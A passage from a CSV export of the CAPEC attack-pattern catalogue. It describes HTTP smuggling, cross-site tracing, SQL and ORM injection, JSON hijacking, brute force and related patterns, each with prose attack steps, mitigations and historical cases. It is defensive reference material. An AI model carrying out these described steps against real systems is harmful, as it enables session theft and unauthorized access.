analysis tool.::\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::\",\"::Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote adversary to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows adversaries to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the adversary to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates.::\",\"::74::113::138::436::\",\"TAXONOMY NAME:WASC:ENTRY ID:24:ENTRY NAME:HTTP Request Splitting::\",\"TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::\",\n107,\"Cross Site Tracing\",Detailed,Draft,\"Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to a destination system's web server.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:593::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine if HTTP Trace is enabled] Determine if HTTP Trace is enabled at the web server with which the victim has an active session:TECHNIQUE:An adversary may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify mechanism to launch HTTP Trace request] The adversary attempts to force the victim to issue an HTTP Trace request to the targeted application.:TECHNIQUE:The adversary probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request.::STEP:3:PHASE:Exploit:DESCRIPTION:[Create a malicious script that pings the web server with HTTP TRACE request] The adversary creates a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the adversary.:TECHNIQUE:The adversary's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response.::STEP:4:PHASE:Exploit:DESCRIPTION:[Execute malicious HTTP Trace launching script] The adversary leverages an XSS vulnerability to force the victim to execute the malicious HTTP Trace launching script::STEP:5:PHASE:Exploit:DESCRIPTION:[Intercept HTTP TRACE response] The adversary's script intercepts the HTTP TRACE response from teh web server, glance sensitive information from it, and forward that information to a server controlled by the adversary.::\",\"::HTTP TRACE is enabled on the web server::The destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policy::Scripting is enabled in the client's browser::HTTP is used as the communication protocol between the server and the client::\",\"::SKILL:Understanding of the HTTP protocol and an ability to craft a malicious script:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Administrators should disable support for HTTP TRACE at the destination's web server. Vendors should disable TRACE by default.::Patch web browser against known security origin policy bypass exploits.::\",\"::An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with their malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system. In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that they control and get it to execute in the victim's browser (if they can trick the victim's into visiting their malicious website or clicking on the link that they supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable them to circumvent the same origin policy protection.::\",\"::693::648::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cross Site Tracing::\",\"\",\n108,\"Command Line Execution through SQL Injection\",Detailed,Draft,\"An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:66::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.::STEP:2:PHASE:Exploit:DESCRIPTION:[Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive] The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject malicious data in the database] Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument::STEP:4:PHASE:Exploit:DESCRIPTION:[Trigger command line execution with injected arguments] The attacker causes execution of command line functionality which leverages previously injected database content as arguments.::\",\"::The application does not properly validate data before storing in the database::Backend application implicitly trusts the data stored in the database::Malicious data is used on the backend as a command line argument::\",\"::SKILL:The attacker most likely has to be familiar with the internal functionality of the system to launch this attack. Without that knowledge, there are not many feedback mechanisms to give an attacker the indication of how to perform command injection or whether the attack is succeeding.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Disable MSSQL xp_cmdshell directive on the database::Properly validate the data (syntactically and semantically) before writing it to the database.::Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).::\",\"::SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function (CVE-2006-6799). Reference: https://www.cve.org/CVERecord?id=CVE-2006-6799::\",\"::89::74::20::78::114::\",\"\",\"\",\n109,\"Object Relational Mapping Injection\",Detailed,Draft,\"An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject their own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:66::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Persistence Framework Used] An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.:TECHNIQUE:An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there.::STEP:2:PHASE:Explore:DESCRIPTION:[Probe for ORM Injection vulnerabilities] The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.::STEP:3:PHASE:Exploit:DESCRIPTION:[Perform SQL Injection through the generated data access layer] An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.:TECHNIQUE:An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.::\",\"::An application uses data access layer generated by an ORM tool or framework::An application uses user supplied data in queries executed against the database::The separation between data plane and control plane is not ensured, through either developer error or an underlying weakness in the data access layer code generation framework::\",\"::SKILL:Knowledge of general SQL injection techniques and subtleties of the ORM framework is needed:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Remember to understand how to use the data access methods generated by the ORM tool / framework properly in a way that would leverage the built-in security mechanisms of the framework::Ensure to keep up to date with security relevant updates to the persistence framework used within your application.::\",\"::When using Hibernate, it is possible to use the session.find() method to run queries against the database. This is an overloaded method that provides facilities to perform binding between the supplied user data and place holders in the statically defined query. However, it is also possible to use the session.find() method without using any of these query binding overloads, hence effectively concatenating the user supplied data with rest of the SQL query, resulting in a possibility for SQL injection. While the framework may provide mechanisms to use methods immune to SQL injections, it may also contain ways that are not immune that may be chosen by the developer.::\",\"::20::89::564::\",\"\",\"\",\n11,\"Cause Web Server Misclassification\",Detailed,Draft,\"An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:635::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Footprint file input vectors] Manually or using an automated tool, an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.:TECHNIQUE:Attacker manually crawls application to identify file inputs:TECHNIQUE:Attacker uses an automated tool to crawl application identify file inputs:TECHNIQUE:Attacker manually assesses strength of access control protecting native application files from user control:TECHNIQUE:Attacker explores potential for submitting files directly to the web server via independently constructed HTTP Requests::STEP:2:PHASE:Experiment:DESCRIPTION:[File misclassification shotgunning] An attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.:TECHNIQUE:Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.:TECHNIQUE:Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server.::STEP:3:PHASE:Experiment:DESCRIPTION:[File misclassification sniping] Understanding how certain file types are processed by web servers, an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.:TECHNIQUE:Craft a malicious file payload, modify file extension to the targeted file type and submit it to the web server.:TECHNIQUE:Craft a malicious file payload, modify its associated MIME type to the targeted file type and submit it to the web server.::STEP:4:PHASE:Exploit:DESCRIPTION:[Disclose information] The attacker, by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).:TECHNIQUE:Manipulate the file names that are explicitly sent to the server.:TECHNIQUE:Manipulate the MIME sent in order to confuse the web server.::\",\"::Web server software must rely on file name or file extension for processing.::The attacker must be able to make HTTP requests to the web server.::\",\"::SKILL:To modify file name or file extension:LEVEL:Low::SKILL:To use misclassification to force the Web server to disclose configuration information, source, or binary data:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Implementation: Server routines should be determined by content not determined by filename or file extension.::\",\"::J2EE application servers are supposed to execute Java Server Pages (JSP). There have been disclosure issues relating to Orion Application Server, where an attacker that appends either a period (.) or space characters to the end of a legitimate Http request, then the server displays the full source code in the attackers' web browser. http://victim.site/login.jsp. Since remote data and directory access may be accessed directly from the JSP, this is a potentially very serious issue. [REF-6]::\",\"::430::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.006:ENTRY NAME:Masquerading: Space after Filename::\",\"\",\n110,\"SQL Injection through SOAP Parameter Tampering\",Detailed,Draft,\"An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:66::NATURE:CanPrecede:CAPEC ID:108::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Detect Incorrect SOAP Parameter Handling] The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.:TECHNIQUE:The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject SQL via SOAP Parameters] The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.:TECHNIQUE:An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.::\",\"::SOAP messages are used as a communication mechanism in the system::SOAP parameters are not properly validated at the service provider::The service provider does not properly utilize parameter binding when building SQL queries::\",\"::SKILL:If the attacker is able to gain good understanding of the system's database schema:LEVEL:Medium::SKILL:If the attacker has to perform Blind SQL Injection:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Properly validate and sanitize/reject user input at the service provider.::Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query.::At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly.::\",\"::An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. They notice that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies their payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure.::\",\"::89::20::\",\"\",\"\",\n111,\"JSON Hijacking (aka JavaScript Hijacking)\",Standard,Draft,\"An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:212::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Understand How to Request JSON Responses from the Target System] An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.:TECHNIQUE:An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers' ability to craft the exploit.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft a malicious website]The attacker crafts a malicious website to which they plan to lure the victim who is using the vulnerable target system. The malicious website does two things: 1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest). 2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker. This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch JSON hijack] An attacker lures the victim to the malicious website or leverages other means to get their malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.:TECHNIQUE:An attacker employs a myriad of standard techniques to get the victim to visit their malicious site or by some other means get the attackers' malicious code executing in the victim's browser.::\",\"::JSON is used as a transport mechanism between the client and the server::The target server cannot differentiate real requests from forged requests::The JSON object returned from the server can be accessed by the attackers' malicious code via a script tag::\",\"::SKILL:Once this attack pattern is developed and understood, creating an exploit is not very complex.The attacker needs to have knowledge of the URLs that need to be accessed on the target system to request the JSON objects.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF), which is to use a hard to guess random nonce (that is unique to the victim's session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce.::On the client side, the system's design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable, it cannot be readily modified by the attacker before being used by a script tag. For instance, if while(1) was added to the beginning of the JavaScript returned by the server, trying to access it with a script tag would result in an infinite loop. On the other hand, legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags, or using other similar techniques (e.g. wrapping the JavaScript with HTML tags).::Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session.::Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role, hence the same origin policy does not adequate address this scenario.::\",\"::Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when they receive it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail. When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker.::\",\"::345::346::352::\",\"\",\"\",\n112,\"Brute Force\",Meta,Draft,\"In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset.\",\"\",,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine secret testing procedure] Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.:TECHNIQUE:Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attackers' position is significantly degraded.::STEP:2:PHASE:Explore:DESCRIPTION:[Reduce search space] Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.:TECHNIQUE:If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.):TECHNIQUE:If the secret was chosen algorithmically, cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.:TECHNIQUE:If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.:TECHNIQUE:Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret.::STEP:3:PHASE:Explore:DESCRIPTION:[Expand victory conditions] It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.::STEP:4:PHASE:Exploit:DESCRIPTION:[Gather information so attack can be performed independently.] If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).::\",\"::The attacker must be able to determine when they have successfully guessed the secret. As such, one-time pads are immune to this type of attack since there is no way to determine when a guess is correct.::\",\"::SKILL:The attack simply requires basic scripting ability to automate the exploration of the search space. More sophisticated attackers may be able to use more advanced methods to reduce the search space and increase the speed with which the secret is located.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack. Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources the attacker has at their disposal. This attack method is resource expensive: having large amounts of computational power do not guarantee timely success, but having only minimal resources makes the problem intractable against all but the weakest secret selection procedures.::\",\"::Repeated submissions of incorrect secret values may indicate a brute force attack. For example, repeated bad passwords when accessing user accounts or repeated queries to databases using non-existent keys.::Attempts to download files protected by secrets (usually using encryption) may be a precursor to an offline attack to break the file's encryption and read its contents. This is especially significant if the file itself contains other secret values, such as password files.::If the attacker is able to perform the checking offline then there will likely be no indication that an attack is ongoing.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Select a provably large secret space for selection of the secret. Provably large means that the procedure by which the secret is selected does not have artifacts that significantly reduce the size of the total secret space.::Use a secret space that is well known and with no known patterns that may reduce functional size.::Do not provide the means for an attacker to determine success independently. This forces the attacker to check their guesses against an external authority, which can slow the attack and warn the defender. This mitigation may not be possible if testing material must appear externally, such as with a transmitted cryptotext.::\",\"\",\"::330::326::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110:ENTRY NAME:Brute Force::::TAXONOMY NAME:WASC:ENTRY ID:11:ENTRY NAME:Brute Force::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Brute force attack::\",\"\",\n113,\"Interface Manipulation\",Meta,Draft,\"An adversary manipulates the use or processing of an interface (e.g. Application Programming Interface (API) or System-on-Chip (SoC)) resulting in an adverse impact upon the security of the system implementing the interface. This can allow the adversary to bypass access control and/or execute functionality not intended by the interface implementation, possibly compromising the system which integrates the interface. Interface manipulation can take on a number of forms including forcing the unexpected use of an interface or the use of an interface in an unintended way.\",\"\",Medium,Medium,\"\",\"\",\"::The target system must expose interface functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the interface or decrypting/de-obfuscating client-server exchanges.::\",\"\",\"::The requirements vary depending upon the nature of the interface. For example, application-layer APIs related to the processing of the HTTP protocol may require one or more of the following: an Adversary-In-The-Middle (CAPEC-94) proxy, a web browser, or a programming/scripting language.::\",\"\",\"\",\"\",\"::An adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution.::API methods not intended for production, such as debugging or testing APIs, may not be disabled when deploying in a production environment. As a result, dangerous functionality can be exposed within the production environment, which an adversary can leverage to execute additional attacks.::SoC components contain insufficient identifiers, which allows an adversary to reset the device at will or read sensitive data from the device.::\",\"::1192::\",\"\",\"\",\n114,\"Authentication Abuse\",Meta,Draft,\"An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker.\",\"\",,Medium,\"\",\"\",\"::An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.::\",\"\",\"::A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.::\",\"\",\"\",\"\",\"\",\"::287::1244::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n115,\"Authentication Bypass\",Meta,Draft,\"An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place.\",\"\",,Medium,\"\",\"\",\"::An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc.::\",\"\",\"::A client application, such as a web browser, or a scripting language capable of interacting with the target.::\",\"\",\"\",\"\",\"\",\"::287::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n116,\"Excavation\",Meta,Stable,\"An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes.\",\"\",High,Medium,\"::NATURE:CanPrecede:CAPEC ID:163::\",\"\",\"::An adversary requires some way of interacting with the system.::\",\"\",\"::A tool, such as an Adversary in the Middle (CAPEC-94) Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Minimize error/response output to only what is necessary for functional use or corrective language.::Remove potentially sensitive information that is not necessary for the application's functionality.::\",\"\",\"::200::1243::\",\"\",\"TYPE:Other:NOTE:Large quantities of data is often moved from the target system to some other adversary controlled system. Data found on a target system might require extensive resources to be fully analyzed. Using these resources on the target system might enable a defender to detect the adversary. Additionally, proper analysis tools required might not be available on the target system.::::TYPE:Other:NOTE:This attack differs from Data Interception and other data collection attacks in that the attacker actively queries the target rather than simply watching for the target to reveal information.::\",\n117,\"Interception\",Meta,Stable,\"An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position themself so as to observe explicit data channels (e.g. network traffic) and read the content. However, this attack differs from a Adversary-In-the-Middle (CAPEC-94) attack, as the adversary does not alter the content of the communications nor forward data to the intended recipient.\",\"\",Low,Medium,\"\",\"\",\"::The target must transmit data over a medium that is accessible to the adversary.::\",\"\",\"::The adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, 